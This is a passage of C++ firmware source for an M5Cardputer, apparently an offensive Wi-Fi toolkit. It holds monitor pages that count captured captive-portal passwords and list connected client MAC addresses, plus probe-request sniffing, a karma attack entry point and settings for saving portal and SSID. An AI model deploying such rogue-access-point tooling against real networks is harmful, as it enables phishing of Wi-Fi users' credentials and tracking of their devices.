         M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
    M5.update();
    M5Cardputer.update();
    delay(10);  // Small delay to reduce CPU load
  }
  while (!inMenu) {
    M5.update();
    M5Cardputer.update();
    handleDnsRequestSerial();
    server.handleClient();

    int newNumClients = WiFi.softAPgetStationNum();
    int newNumPasswords = countPasswordsInFile();

    if (newNumClients != oldNumClients) {
      M5.Display.fillRect(0, 15, 50, 10, menuBackgroundColor);
      M5.Display.setCursor(5, 15);
      M5.Display.println("Clients: " + String(newNumClients));
      oldNumClients = newNumClients;
    }

    if (newNumPasswords != oldNumPasswords) {
      M5.Display.fillRect(0, 30, 50, 10, menuBackgroundColor);
      M5.Display.setCursor(5, 30);
      M5.Display.println("Passwords: " + String(newNumPasswords));
      oldNumPasswords = newNumPasswords;
    }

    if (millis() - lastKeyPressTime > debounceDelay) {
      if (M5Cardputer.Keyboard.isKeyPressed(',')) {
        displayMonitorPage3();  // Navigate to the last page
        break;
      } else if (M5Cardputer.Keyboard.isKeyPressed('/')) {
        displayMonitorPage2();  // Navigate to the next page
        break;
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        inMenu = true;
        drawMenu();
        break;
      }
      lastKeyPressTime = millis();  // Reset debounce timer
    }
  }
}



// --- Helpers MAC list / UI ---
static String _prevMacs[MAC_MAX];
static int _prevCount = 0;

static inline bool containsMac(const String arr[], int n, const String &mac) {
  for (int i = 0; i < n; ++i) if (arr[i] == mac) return true;
  return false;
}

static void copyMacList(const String src[], int n, String dst[]) {
  for (int i = 0; i < MAC_MAX; ++i) dst[i] = (i < n) ? src[i] : "";
}

static void logDiffsAndMakeTicker(const String before[], int nBefore,
                                  const String after[],  int nAfter,
                                  String &tickerMsg, unsigned long &tickerUntilMs) {
  // Cherche un join/leave simple pour affichage
  for (int i = 0; i < nAfter; ++i) {
    if (!containsMac(before, nBefore, after[i])) {
      Serial.print(F("[+] Join: ")); Serial.println(after[i]);
      tickerMsg = "Join " + after[i];
      tickerUntilMs = millis() + 1200;
      return;
    }
  }
  for (int i = 0; i < nBefore; ++i) {
    if (!containsMac(after, nAfter, before[i])) {
      Serial.print(F("[-] Leave: ")); Serial.println(before[i]);
      tickerMsg = "Leave " + before[i];
      tickerUntilMs = millis() + 1200;
      return;
    }
  }
}


void updateConnectedMACs() {
  wifi_sta_list_t stationList;
  tcpip_adapter_sta_list_t adapterList;
  esp_wifi_ap_get_sta_list(&stationList);
  tcpip_adapter_get_sta_list(&stationList, &adapterList);

  int count = min((int)adapterList.num, MAC_MAX);
  if ((int)macAddresses.size() < MAC_MAX) macAddresses.assign(MAC_MAX, String());
  for (int i = 0; i < count; i++) {
    char macStr[18];
    snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
             adapterList.sta[i].mac[0], adapterList.sta[i].mac[1], adapterList.sta[i].mac[2],
             adapterList.sta[i].mac[3], adapterList.sta[i].mac[4], adapterList.sta[i].mac[5]);
    macAddresses[i] = String(macStr);
  }
  // Nettoie le reste
  for (int i = count; i < MAC_MAX; i++) macAddresses[i] = "";
  numConnectedMACs = count;
}

void displayMonitorPage2() {
  // Layout
  const int lineHeight   = 12;
  const int topY         = 15;   // zone liste
  const int bottomPad    = 12;   // bandeau ticker
  const int listHeight   = M5.Display.height() - topY - bottomPad; // 135-15-12=108
  const int maxVisible   = listHeight / lineHeight;                 // 108/12=9 lignes visibles

  // Etat de scroll & ticker
  int topIndex = 0;
  String ticker = "";
  unsigned long tickerUntil = 0;

  // PrÃ©-affichage
  M5.Display.clear();
  M5.Display.setTextSize(1.5);
  M5.Lcd.setTextColor(menuTextUnFocusedColor, TFT_BLACK);

  // snapshot initial
  updateConnectedMACs();
  copyMacList(macAddresses.data(), numConnectedMACs, _prevMacs);
  _prevCount = numConnectedMACs;

  auto drawHeader = [&](){
    M5.Display.setCursor(5, 5);
    M5.Display.println("Connected MACs (" + String(numConnectedMACs) + ")");
  };

  auto drawList = [&](){
    // Efface zone liste
    M5.Display.fillRect(0, topY, M5.Display.width(), listHeight, menuBackgroundColor);
    // Affiche les lignes visibles
    for (int i = 0; i < maxVisible; ++i) {
      int idx = topIndex + i;
      int y = topY + i * lineHeight;
      if (idx < numConnectedMACs) {
        M5.Display.setCursor(10, y);
        M5.Display.println(macAddresses[idx]);
      }
    }
  };

  auto drawTicker = [&](){
    M5.Display.fillRect(0, M5.Display.height() - bottomPad, M5.Display.width(), bottomPad, menuBackgroundColor);
    if (ticker.length() && millis() < tickerUntil) {
      M5.Display.setCursor(5, M5.Display.height() - bottomPad + 1);
      M5.Display.println(ticker);
    }
  };

  drawHeader();
  drawList();
  drawTicker();
  M5.Display.display();

  // anti-rebond initial
  while (M5Cardputer.Keyboard.isKeyPressed(',') ||
         M5Cardputer.Keyboard.isKeyPressed('/') ||
         M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) ||
         M5Cardputer.Keyboard.isKeyPressed(';') ||
         M5Cardputer.Keyboard.isKeyPressed('.')) {
    M5.update(); M5Cardputer.update(); delay(10);
  }

  // Boucle temps rÃ©el
  unsigned long lastRefresh = 0;
  const unsigned long refreshMs = 500; // cadence de rafraÃ®chissement
  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 150;

  while (!inMenu) {
    M5.update();
    M5Cardputer.update();
    handleDnsRequestSerial();

    bool needRedrawHeader = false;
    bool needRedrawList   = false;
    bool needRedrawTicker = false;

    // MAJ pÃ©riodique de la liste
    if (millis() - lastRefresh >= refreshMs) {
      lastRefresh = millis();

      // snapshot actuel
      updateConnectedMACs();

      // dÃ©tection join/leave -> ticker + logs
      String oldCopy[MAC_MAX]; copyMacList(_prevMacs, _prevCount, oldCopy);
      String newCopy[MAC_MAX];
      copyMacList(macAddresses.data(), numConnectedMACs, newCopy);
      logDiffsAndMakeTicker(oldCopy, _prevCount, newCopy, numConnectedMACs, ticker, tickerUntil);
      if (ticker.length()) needRedrawTicker = true;

      // si contenu ou nombre change â†’ redraw + header
      bool changed = (_prevCount != numConnectedMACs);
      if (!changed) {
        for (int i = 0; i < numConnectedMACs; ++i) {
          if (_prevMacs[i] != macAddresses[i]) { changed = true; break; }
        }
      }
      if (changed) {
        copyMacList(macAddresses.data(), numConnectedMACs, _prevMacs);
        _prevCount = numConnectedMACs;

        // bornes de scroll
        if (topIndex > max(0, numConnectedMACs - maxVisible)) {
          topIndex = max(0, numConnectedMACs - maxVisible);
        }
        needRedrawHeader = true;
        needRedrawList   = true;
      }
    }

    // Gestion des touches (scroll/page/menu)
    if (millis() - lastKeyPressTime > debounceDelay) {
      if (M5Cardputer.Keyboard.isKeyPressed(';')) {                 // scroll up
        if (topIndex > 0) { topIndex--; needRedrawList = true; }
        lastKeyPressTime = millis();
      } else if (M5Cardputer.Keyboard.isKeyPressed('.')) {          // scroll down
        int maxTop = max(0, numConnectedMACs - maxVisible);
        if (topIndex < maxTop) { topIndex++; needRedrawList = true; }
        lastKeyPressTime = millis();
      } else if (M5Cardputer.Keyboard.isKeyPressed(',')) {          // page prÃ©cÃ©dente
        displayMonitorPage1();
        break;
      } else if (M5Cardputer.Keyboard.isKeyPressed('/')) {          // page suivante
        displayMonitorPage3();
        break;
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        inMenu = true;
        drawMenu();
        break;
      }
    }

    // RafraÃ®chissements ciblÃ©s
    if (needRedrawHeader) { drawHeader(); }
    if (needRedrawList)   { drawList();   }
    if (needRedrawTicker) { drawTicker(); }

    if (needRedrawHeader || needRedrawList || needRedrawTicker) {
      M5.Display.display();
    }

    delay(20); // baisse charge CPU, pas dâ€™impact UX
  }
}



String oldStack = "";
String oldRamUsage = "";
String oldBatteryLevel = "";
String oldTemperature = "";

#include <driver/adc.h>
#include <esp_adc_cal.h>

String getBatteryLevel() {
  int percent = -1;

  if (M5.getBoard() == m5::board_t::board_M5Cardputer) {
    // Normal Cardputer â†’ API standard
    percent = M5.Power.getBatteryLevel();
  } 
  else if (M5.getBoard() == m5::board_t::board_M5CardputerADV) {
    // ADV â†’ lecture via ADC
    const int BASE_VOLTAGE = 3600; // rÃ©fÃ©rence de calibration
    static esp_adc_cal_characteristics_t *adc_chars = nullptr;

    if (!adc_chars) {
      adc_chars = (esp_adc_cal_characteristics_t *)calloc(1, sizeof(esp_adc_cal_characteristics_t));
      adc1_config_width(ADC_WIDTH_BIT_12);
      adc1_config_channel_atten(ADC1_CHANNEL_9, ADC_ATTEN_DB_11); // GPIO10
      esp_adc_cal_characterize(ADC_UNIT_1, ADC_ATTEN_DB_11, ADC_WIDTH_BIT_12, BASE_VOLTAGE, adc_chars);
    }

    int raw = adc1_get_raw(ADC1_CHANNEL_9);
    uint32_t mv = esp_adc_cal_raw_to_voltage(raw, adc_chars) * 2; // facteur 2 car diviseur interne

    percent = (mv - 3300) * 100.0 / (4150 - 3350); // map tension â†’ %
    if (percent < 0) percent = 0;
    if (percent > 100) percent = 100;
  }

  // Retourne "error" si rien de valide
  if (percent < 0) {
    return String("error");
  } else {
    return String(percent);
  }
}



String getTemperature() {
  float temperature;
  M5.Imu.getTemp(&temperature);
  int roundedTemperature = round(temperature);
  return String(roundedTemperature);
}

String getStack() {
  UBaseType_t stackWordsRemaining = uxTaskGetStackHighWaterMark(NULL);
  return String(stackWordsRemaining * 4 / 1024.0);
}


String getRamUsage() {
  int heapSizeInKB = esp_get_free_heap_size() / 1024;
  return String(heapSizeInKB);
}


unsigned long lastUpdateTime = 0;
const long updateInterval = 1000;

void displayMonitorPage3() {
  M5.Display.clear();
  M5.Display.setTextSize(1.5);
  M5.Lcd.setTextColor(menuTextUnFocusedColor, TFT_BLACK);

  oldStack = getStack();
  oldRamUsage = getRamUsage();
  oldBatteryLevel = getBatteryLevel();

  M5.Display.setCursor(10 / 4, 15);
  M5.Display.println("Stack left: " + oldStack + " Kb");
  M5.Display.setCursor(10 / 4, 30);
  M5.Display.println("RAM: " + oldRamUsage + " Ko");
  M5.Display.setCursor(10 / 4, 45);
  M5.Display.println("Battery: " + oldBatteryLevel + "%");

  M5.Display.display();
  lastUpdateTime = millis();

  oldStack = "";
  oldRamUsage = "";
  oldBatteryLevel = "";

  M5.Display.display();

  unsigned long lastKeyPressTime = 0;
  const unsigned long debounceDelay = 200; // Debounce delay in milliseconds
  while (M5Cardputer.Keyboard.isKeyPressed(',') ||
         M5Cardputer.Keyboard.isKeyPressed('/') ||
         M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
    M5.update();
    M5Cardputer.update();
    delay(10);  // Small delay to reduce CPU load
  }

  while (!inMenu) {
    M5.update();
    M5Cardputer.update();
    handleDnsRequestSerial();

    unsigned long currentMillis = millis();

    if (currentMillis - lastUpdateTime >= updateInterval) {
      // RÃ©cupÃ©rer les nouvelles valeurs
      String newStack = getStack();
      String newRamUsage = getRamUsage();
      String newBatteryLevel = getBatteryLevel();
      int newBatteryCurrent = M5.Power.getBatteryCurrent();

      // Afficher les valeurs mises Ã  jour
      if (newStack != oldStack) {
        M5.Display.setCursor(10 / 4, 15);
        M5.Display.println("Stack left: " + newStack + " Kb");
        oldStack = newStack;
      }

      if (newRamUsage != oldRamUsage) {
        M5.Display.setCursor(10 / 4, 30);
        M5.Display.println("RAM: " + newRamUsage + " Ko");
        oldRamUsage = newRamUsage;
      }

      if (newBatteryLevel != oldBatteryLevel) {
        M5.Display.setCursor(10 / 4, 45);
        M5.Display.println("Battery: " + newBatteryLevel + "%");
        oldBatteryLevel = newBatteryLevel;
      }

      lastUpdateTime = currentMillis;
    }

    if (millis() - lastKeyPressTime > debounceDelay) {
      if (M5Cardputer.Keyboard.isKeyPressed(',')) {
        displayMonitorPage2();  // Go back to the second page
        break;
      } else if (M5Cardputer.Keyboard.isKeyPressed('/')) {
        displayMonitorPage1();  // Go back to the first page
        break;
      } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
        inMenu = true;
        drawMenu();
        break;
      }
      lastKeyPressTime = millis();  // Reset debounce timer
    }
  }
}



void probeSniffing() {
  isProbeSniffingMode = true;
  isProbeSniffingRunning = true;
  startScanKarma();

  uint8_t channels[] = {1, 6, 11};
  size_t channelIndex = 0;
  unsigned long lastHop = millis();
  const unsigned long hopInterval = 333; // 250 ms

  while (isProbeSniffingRunning) {
    M5Cardputer.update();
    handleDnsRequestSerial();

    if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
      stopProbeSniffingViaSerial = false;
      isProbeSniffingRunning = false;
      break;
    }

    unsigned long now = millis();
    if (now - lastHop >= hopInterval) {
      esp_wifi_set_channel(channels[channelIndex], WIFI_SECOND_CHAN_NONE);
      channelIndex = (channelIndex + 1) % (sizeof(channels) / sizeof(channels[0]));
      lastHop = now;
    }
  }

  stopScanKarma();
  isProbeSniffingMode = false;
  if (stopProbeSniffingViaSerial) {
    stopProbeSniffingViaSerial = false;
  }
}




void karmaAttack() {
  drawStartButtonKarma();
}

void waitAndReturnToMenu(String message) {
  const int screenWidth = 240;
  const int screenHeight = 135;
  const int charWidth = 10;  // Largeur approximative d'un caractÃ¨re
  const int maxCharsPerLine = screenWidth / charWidth;

  M5.Display.clear();
  M5.Display.setTextSize(1.5);
  M5.Display.setTextColor(menuTextUnFocusedColor);

  // DÃ©couper le message en plusieurs lignes
  std::vector<String> lines;
  String currentLine = "";
  for (int i = 0; i < message.length(); i++) {
    char currentChar = message.charAt(i);
    if (currentChar == ' ' && currentLine.length() >= maxCharsPerLine) {
      lines.push_back(currentLine);
      currentLine = "";
    }
    currentLine += currentChar;

    // Si la ligne dÃ©passe la longueur maximale
    if (currentLine.length() >= maxCharsPerLine) {
      int lastSpace = currentLine.lastIndexOf(' ');
      if (lastSpace != -1) {
        // Couper Ã  l'espace le plus proche pour Ã©viter de couper un mot
        lines.push_back(currentLine.substring(0, lastSpace));
        currentLine = currentLine.substring(lastSpace + 1);
      } else {
        lines.push_back(currentLine);
        currentLine = "";
      }
    }
  }
  if (currentLine.length() > 0) {
    lines.push_back(currentLine);
  }

  // Calculer la position de dÃ©part pour centrer verticalement
  int totalTextHeight = lines.size() * 12;  // 20 pixels par ligne (environ)
  int startY = (screenHeight - totalTextHeight) / 2;

  // Afficher chaque ligne au centre horizontalement et verticalement
  for (int i = 0; i < lines.size(); i++) {
    String line = lines[i];
    int lineWidth = line.length() * charWidth;
    int startX = (screenWidth - lineWidth) / 2;  // Calculer la position X pour centrer

    M5.Display.setCursor(startX, startY + i * 12);
    M5.Display.println(line);
  }

  M5.Display.display();
  delay(1500);
  inMenu = true;
  drawMenu();
}


void loopOptions(std::vector<std::pair<String, std::function<void()>>> &options, bool loop, bool displayTitle, const String &title = "") {
    int currentIndex = 0;
    bool selectionMade = false;
    const int lineHeight = 12;
    const int maxVisibleLines = 11;
    int menuStartIndex = 0;

    M5.Display.clear();
    M5.Display.setTextSize(1.5);
    M5.Display.setTextFont(1);
    enterDebounce();

    for (int i = 0; i < maxVisibleLines; ++i) {
        int optionIndex = menuStartIndex + i;
        if (optionIndex >= options.size()) break;

        if (optionIndex == currentIndex) {
            M5.Display.fillRect(0, 0 + i * lineHeight, M5.Display.width(), lineHeight, menuSelectedBackgroundColor);
            M5.Display.setTextColor(menuTextFocusedColor);
        } else {
            M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
        }
        M5.Display.setCursor(5, 0 + i * lineHeight);
        M5.Display.println(options[optionIndex].first);
    }
    M5.Display.display();

    while (!selectionMade) {
        M5.update();
        M5Cardputer.update();

        bool screenNeedsUpdate = false;

        if (M5Cardputer.Keyboard.isKeyPressed(';')) {
            currentIndex = (currentIndex - 1 + options.size()) % options.size();
            menuStartIndex = max(0, min(currentIndex, (int)options.size() - maxVisibleLines));
            screenNeedsUpdate = true;
            delay(150); // anti-rebond
        } else if (M5Cardputer.Keyboard.isKeyPressed('.')) {
            currentIndex = (currentIndex + 1) % options.size();
            menuStartIndex = max(0, min(currentIndex, (int)options.size() - maxVisibleLines));
            screenNeedsUpdate = true;
            delay(150); // anti-rebond
        } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
            options[currentIndex].second();
            if (!loop) {
                selectionMade = true;
            }
        } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
            selectionMade = true;
            delay(150); // anti-rebond
            waitAndReturnToMenu("Back to menu");
        }

        if (screenNeedsUpdate) {
            M5.Display.clear();

            for (int i = 0; i < maxVisibleLines; ++i) {
                int optionIndex = menuStartIndex + i;
                if (optionIndex >= options.size()) break;

                if (optionIndex == currentIndex) {
                    M5.Display.fillRect(0, 0 + i * lineHeight, M5.Display.width(), lineHeight, menuSelectedBackgroundColor);
                    M5.Display.setTextColor(menuTextFocusedColor);
                } else {
                    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
                }
                M5.Display.setCursor(5, 0 + i * lineHeight);
                M5.Display.println(options[optionIndex].first);
            }

            M5.Display.display();
        }

        delay(100);
    }
}


/*
============================================================================================================================
Settings
============================================================================================================================
*/

void showSettingsMenu() {
    std::vector<std::pair<String, std::function<void()>>> options;

    bool continueSettingsMenu = true;

    while (continueSettingsMenu) {
        options.clear();

        options.push_back({"Brightness", brightness});
        options.push_back({soundOn ? "Disable Sound" : "Enable Sound", []() {toggleSound();}});
        options.push_back({ledOn ? "Disable LED" : "Enable LED", []() {toggleLED();}});
        options.push_back({String("Switch GPS Pins to: ") + ((gpsPinsMode == 1 || (gpsRxPin == 15 && gpsTxPin == 13)) ? "1/2" : ((gpsPinsMode == 0 || (gpsRxPin == 1 && gpsTxPin == -1)) ? "15/13" : "Auto")), [](){ toggleGpsPinsMode(); }});
        options.push_back({"Set GPS Baudrate", []() {setGPSBaudrate();}});
        options.push_back({"Set Startup Image", setStartupImage});
        options.push_back({"Set Startup Volume", adjustVolume});
        options.push_back({"Set Startup Sound", setStartupSound});
        options.push_back({randomOn ? "Disable Random startup" : "Enable Random startup", []() {toggleRandom();}});        options.push_back({"Save current Portal & SSID", []() { saveCurrentPortalAndSSID(); }});
        options.push_back({ startAtBootFlag ? "Disable Auto at boot" : "Enable Auto at boot", [](){ toggleStartAtBoot(); }});
        options.push_back({ String("Set Auto Function"), [](){ setBootStartCase(); }});
        options.push_back({ String("Set Auto Countdown"), [](){ setBootCountdown(); }});
        options.push_back({"Set CPU Frequency", setCPUFrequency});
        options.push_back({"Change Portal IP", setCaptivePortalIP});
        
        loopOptions(options, false, true, "Settings");
        // VÃ©rifie si BACKSPACE a Ã©tÃ© pressÃ© pour quitter le menu
        if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
            continueSettingsMenu = false;
        }
    }
    inMenu = true;
}



void setCPUFrequency() {
    std::vector<int> freqs = {80, 160, 240};
    int currentIndex = 0;
    bool freqSelected = false;
    bool needDisplayUpdate = true;

    enterDebounce();

    while (!freqSelected) {
        if (needDisplayUpdate) {
            M5.Display.clear();
            M5.Display.setCursor(5, 5);
            M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
            M5.Display.println("Select CPU Frequency:");

            // --- afficher la frÃ©quence actuelle ---
            int currentFreq = getCpuFrequencyMhz();
            M5.Display.setTextColor(TFT_YELLOW, menuBackgroundColor);
            M5.Display.println("Current: " + String(currentFreq) + " MHz");
            M5.Display.println(""); // ligne vide avant la liste

            // --- afficher la liste des options ---
            for (int i = 0; i < freqs.size(); i++) {
                if (i == currentIndex) {
                    M5.Display.setTextColor(menuTextFocusedColor);
                } else {
                    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
                }
                M5.Display.println(String(freqs[i]) + " MHz");
            }

            needDisplayUpdate = false;
        }

        M5.update();
        M5Cardputer.update();

        if (M5Cardputer.Keyboard.isKeyPressed(';')) { // haut
            currentIndex = (currentIndex - 1 + freqs.size()) % freqs.size();
            needDisplayUpdate = true;
        } else if (M5Cardputer.Keyboard.isKeyPressed('.')) { // bas
            currentIndex = (currentIndex + 1) % freqs.size();
            needDisplayUpdate = true;
        } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
            int selectedFreq = freqs[currentIndex];
            setCpuFrequencyMhz(selectedFreq);
            saveConfigParameter("cpu_freq", selectedFreq); // sauvegarde
            M5.Display.fillScreen(menuBackgroundColor);
            M5.Display.setCursor(5, M5.Display.height() / 2);
            M5.Display.print("CPU set to " + String(selectedFreq) + " MHz");
            Serial.println("CPU Frequency changed to " + String(selectedFreq) + " MHz");
            delay(1000);
            freqSelected = true;
        } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
            freqSelected = true;
        }

        delay(150); // anti-rebond
    }
}


void setGPSBaudrate() {
    // Liste des baudrates disponibles
    std::vector<int> baudrates = {9600, 19200, 115200};
    int currentBaudrateIndex = 0;
    bool baudrateSelected = false;

    const int maxDisplayItems = 3; // Tous les items peuvent Ãªtre affichÃ©s simultanÃ©ment
    bool needDisplayUpdate = true;

    enterDebounce();
    while (!baudrateSelected) {
        if (needDisplayUpdate) {
            M5.Display.clear();
            M5.Display.setCursor(5, 5);
            M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
            M5.Display.println("Select GPS Baudrate:");

            for (int i = 0; i < baudrates.size(); i++) {
                if (i == currentBaudrateIndex) {
                    M5.Display.setTextColor(menuTextFocusedColor); // Highlight selected item
                } else {
                    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK); // Normal text color
                }
                M5.Display.println(String(baudrates[i]));
            }

            needDisplayUpdate = false; // Reset the display update flag
        }

        M5.update();
        M5Cardputer.update();

        // Navigation vers le haut
        if (M5Cardputer.Keyboard.isKeyPressed(';')) {
            currentBaudrateIndex = (currentBaudrateIndex - 1 + baudrates.size()) % baudrates.size();
            needDisplayUpdate = true;
        } 
        // Navigation vers le bas
        else if (M5Cardputer.Keyboard.isKeyPressed('.')) {
            currentBaudrateIndex = (currentBaudrateIndex + 1) % baudrates.size();
            needDisplayUpdate = true;
        } 
        // SÃ©lectionner le baudrate
        else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
            baudrate_gps = baudrates[currentBaudrateIndex];
            saveGPSBaudrateConfig(baudrate_gps);
            M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
            M5.Display.fillScreen(menuBackgroundColor);
            M5.Display.setCursor(5, M5.Display.height() / 2);
            M5.Display.print("GPS Baudrate set to\n" + String(baudrate_gps));
            cardgps.end();
            cardgps.begin(baudrate_gps, SERIAL_8N1, gpsRxPin, gpsTxPin);
            delay(1000);
            baudrateSelected = true;
        } 
        // Quitter sans sÃ©lectionner
        else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
            baudrateSelected = true;
        }

        delay(150);  // Anti-bounce delay for key presses
    }
}

void saveGPSBaudrateConfig(int baudrate) {
    // Lire le contenu du fichier de configuration
    File file = SD.open(configFilePath, FILE_READ);
    String content = "";
    bool found = false;

    if (file) {
        while (file.available()) {
            String line = file.readStringUntil('\n');
            if (line.startsWith("baudrate_gps=")) {
                // Remplacer la ligne existante par la nouvelle valeur
                content += "baudrate_gps=" + String(baudrate) + "\n";
                found = true;
            } else {
                // Conserver les autres lignes
                content += line + "\n";
            }
        }
        file.close();
    }

    // Si la clÃ© n'a pas Ã©tÃ© trouvÃ©e, l'ajouter Ã  la fin
    if (!found) {
        content += "baudrate_gps=" + String(baudrate) + "\n";
    }

    // RÃ©Ã©crire tout le fichier de configuration
    file = SD.open(configFilePath, FILE_WRITE);
    if (file) {
        file.print(content);
        file.close();
    }
}

// --- Boot auto-start settings actions ---
void toggleStartAtBoot() {
  enterDebounce();
  startAtBootFlag = !startAtBootFlag;
  saveConfigParameter("startatboot", startAtBootFlag ? 1 : 0);
  String msg = String("Auto-start ") + (startAtBootFlag ? "enabled" : "disabled");
  waitAndReturnToMenu(msg);
}

void setBootStartCase() {
  enterDebounce();
  // Build labels from menuItems
  std::vector<String> labels; labels.reserve(menuSize);
  for (int i = 0; i < menuSize; ++i) {
    String s = String(i) + String(". ") + String((const char*)menuItems[i]);
    labels.push_back(s);
  }
  int sel = menuSelectList(labels, "Select boot case");
  if (sel >= 0) {
    caseToStartAtBoot = sel;
    saveConfigParameter("casetostartatboot", sel);
    String msg = String("Boot case set to ") + String(sel);
    waitAndReturnToMenu(msg);
  } else {
    waitAndReturnToMenu("Canceled");
  }
}

void setBootCountdown() {
  enterDebounce();
  // Simple list 0..10 seconds
  std::vector<String> secLabels; secLabels.reserve(11);
  for (int s = 0; s <= 10; ++s) secLabels.push_back(String(s));
  int idx = menuSelectList(secLabels, "Select countdown (s)");
  if (idx >= 0) {
    bootCountdownSeconds = idx;
    saveConfigParameter("boot_countdown", bootCountdownSeconds);
    String msg = String("Countdown set to ") + String(bootCountdownSeconds) + String(" s");
    waitAndReturnToMenu(msg);
  } else {
    waitAndReturnToMenu("Canceled");
  }
}



void saveStartupSoundConfig(const String& paramValue) {
    // Lire le contenu du fichier de configuration
    File file = SD.open(configFilePath, FILE_READ);
    String content = "";
    bool found = false;

    if (file) {
        while (file.available()) {
            String line = file.readStringUntil('\n');
            if (line.startsWith("startupSound=")) {
                // Remplacer la ligne existante par la nouvelle valeur
                content += "startupSound=/evil/audio/" + paramValue + "\n";
                found = true;
            } else {
                // Conserver les autres lignes
                content += line + "\n";
            }
        }
        file.close();
    }

    // Si la clÃ© n'a pas Ã©tÃ© trouvÃ©e, l'ajouter Ã  la fin
    if (!found) {
        content += "startupSound=/evil/audio/" + paramValue + "\n";
    }

    // RÃ©Ã©crire tout le fichier de configuration
    file = SD.open(configFilePath, FILE_WRITE);
    if (file) {
        file.print(content);
        file.close();
    }
}

void loadStartupSoundConfig() {
    File file = SD.open(configFilePath, FILE_READ);
    if (file) {
        while (file.available()) {
            String line = file.readStringUntil('\n');
            if (line.startsWith("startupSound")) {
                selectedStartupSound = line.substring(line.indexOf('=') + 1);
                break;
            }
        }
        file.close();
    }
}
void setStartupSound() {
    File root = SD.open("/evil/audio");
    std::vector<String> sounds;

    while (File file = root.openNextFile()) {
        if (!file.isDirectory()) {
            String fileName = file.name();
            if (fileName.endsWith(".mp3")) {
                sounds.push_back(fileName);
            }
        }
        file.close();
    }
    root.close();

    if (sounds.size() == 0) {
        M5.Display.clear();
        M5.Display.println("No sounds found");
        delay(2000);
        return;
    }

    int currentSoundIndex = 0;
    bool soundSelected = false;
    const int maxDisplayItems = 10;  // Nombre maximum d'Ã©lÃ©ments Ã  afficher en mÃªme temps
    const int maxFileNameLength = 26;  // Limite de caractÃ¨res pour le nom du fichier
    int menuStartIndex = 0;
    bool needDisplayUpdate = true;

    enterDebounce();
    while (!soundSelected) {
        if (needDisplayUpdate) {
            M5.Display.clear();
            M5.Display.setCursor(5, 5);
            M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
            M5.Display.println("Select Startup Sound:");

            for (int i = 0; i < maxDisplayItems && (menuStartIndex + i) < sounds.size(); i++) {
                int itemIndex = menuStartIndex + i;
                String displayFileName = sounds[itemIndex];

                // Truncate the file name if it's too long
                if (displayFileName.length() > maxFileNameLength) {
                    displayFileName = displayFileName.substring(0, maxFileNameLength);
                }

                if (itemIndex == currentSoundIndex) {
                    M5.Display.setTextColor(menuTextFocusedColor); // Highlight selected item
                } else {
                    M5.Display.setTextColor(menuTextUnFocusedColor, TFT_BLACK); // Normal text color
                }
                M5.Display.println(displayFileName);
            }

            needDisplayUpdate = false; // Reset the display update flag
        }

        M5.update();
        M5Cardputer.update();

        if (M5Cardputer.Keyboard.isKeyPressed(';')) {
            currentSoundIndex = (currentSoundIndex - 1 + sounds.size()) % sounds.size();
            if (currentSoundIndex < menuStartIndex) {
                menuStartIndex = currentSoundIndex;
            } else if (currentSoundIndex >= menuStartIndex + maxDisplayItems) {
                menuStartIndex = currentSoundIndex - maxDisplayItems + 1;
            }
            needDisplayUpdate = true; // Mark for display update
        } else if (M5Cardputer.Keyboard.isKeyPressed('.')) {
            currentSoundIndex = (currentSoundIndex + 1) % sounds.size();
            if (currentSoundIndex >= menuStartIndex + maxDisplayItems) {
                menuStartIndex = currentSoundIndex - maxDisplayItems + 1;
            } else if (currentSoundIndex < menuStartIndex) {
                menuStartIndex = currentSoundIndex;
            }
            needDisplayUpdate = true; // Mark for display update
        } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
            selectedStartupSound = sounds[currentSoundIndex];
            saveStartupSoundConfig(selectedStartupSound);
            M5.Display.setTextColor(menuTextFocusedColor, menuBackgroundColor);
            M5.Display.fillScreen(menuBackgroundColor);
            M5.Display.setCursor(5, M5.Display.height() / 2);
            M5.Display.print("Startup sound set to\n" + selectedStartupSound);
            delay(1000);
            soundSelected = true;
        } else if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
            soundSelected = true;
        } else if (M5Cardputer.Keyboard.isKeyPressed('p')) {
            String soundPath = "/evil/audio/" + sounds[currentSoundIndex];
            play(soundPath.c_str());
            while (mp3.isRunning()) {
                if (!mp3.loop()) {
                    mp3.stop();
                }
                delay(1);
            }
        }

        delay(150);  // Anti-bounce delay for key presses
    }
}

void saveStartupImageConfig(const String& paramValue) {
    // Lire le contenu du fichier de configuration
    File file = SD.open(configFilePath, FILE_READ);
    String content = "";
    bool found = false;

    if (file) {
        while (file.available()) {
            String line = file.readStringUntil('\n');
            if (line.startsWith("startupImage=")) {
                // Remplacer la ligne existante par la nouvelle valeur
                content += "startupImage=/evil/img/" + paramValue + "\n";
                found = true;
            } else {
                // Conserver les autres lignes
                content += line + "\n";
            }
        }
        file.close();
    }

    // Si la clÃ© n'a pas Ã©tÃ© trouvÃ©e, l'ajouter Ã  la fin
